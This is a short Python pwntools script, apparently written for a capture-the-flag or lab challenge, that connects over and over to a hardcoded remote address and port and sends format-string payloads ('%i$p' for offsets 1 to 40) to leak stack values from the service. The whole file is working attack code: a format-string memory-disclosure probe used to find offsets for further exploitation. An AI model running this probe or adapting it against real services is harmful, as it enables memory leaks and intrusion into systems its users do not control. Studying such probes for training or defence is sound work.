from pwn import *

context.log_level = 'error'  # Quiet mode

HOST = '194.31.53.241'
PORT = 1342
MAX_OFFSET = 40

for i in range(1, MAX_OFFSET + 1):
    try:
        r = remote(HOST, PORT, timeout=3)
        payload = f"%{i}$p"
        r.recvuntil(b"Enter your format string: ")
        r.sendline(payload.encode())

        response = r.recvline(timeout=2).strip()
        print(f"[{i:02}] {payload} => {response.decode(errors='replace')}")

        r.close()
    except Exception as e:
        print(f"[{i:02}] {payload} => ERROR: {e}")
